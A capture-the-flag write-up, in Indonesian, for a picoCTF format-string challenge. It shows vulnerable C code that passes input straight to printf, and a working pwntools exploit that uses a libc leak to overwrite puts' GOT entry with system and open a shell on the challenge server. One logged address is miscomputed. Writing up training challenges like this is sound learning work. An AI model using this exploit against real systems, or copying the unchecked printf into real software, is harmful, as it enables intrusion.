# Format-string-3
## Problem
```
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}

```
## Rencana
Ada beberapa hal yang perlu kita ketahui sebelum menyusun rencana:
* Terdapat normal_string yang isinya /bin/sh
* normal_string tersebut menjadi parameter puts, sehingga ini adalah vuln yang sangat jelas, yaitu mengubah got puts menjadi system
* libc dileak dengan sengaja oleh program untuk mempermudah pengerjaan

Maka rencananya ialah:
* Cek offset input
* Mengambil hasl leak dari function hello()
* Mendapatkan alamat dasar libc dari mengurangi nilai leak dengan offset setvbuf di ./libc.so.6
* buat payload menggunakan fmtstr_payload()
* kirim
* ambil flag

## Payload
```
from pwn import *

p = remote('rhea.picoctf.net', 56055)

p.recvuntil(b"Here's the address of setvbuf in libc: ")
leak = p.recvline().strip()
setvbuf_addr = int(leak, 16)
log.success(f"Leaked setvbuf: {hex(setvbuf_addr)}")

# Setup ELF
elf = context.binary = ELF('./format-string-3')
libc = ELF('./libc.so.6')
print(f"setvbuf offset: {hex(libc.symbols['setvbuf'])}")
print(f"system offset:  {hex(libc.symbols['system'])}")
print(f"Libc address:   {hex(libc.address)}")


libc.address = setvbuf_addr - libc.symbols['setvbuf']

offset = 38

log.info(f"Offset: {offset}")
log.info(f"Libc base: {hex(libc.address)}")
log.info(f"system: {hex(libc.symbols['system'])}")

system_addr = libc.address + libc.symbols['system']

log.info(f"system_addr: {hex(system_addr)}")


payload = fmtstr_payload(offset, {elf.got['puts'] : libc.sym['system']})

p.sendline(payload)

p.clean()

p.interactive()

p.close()

```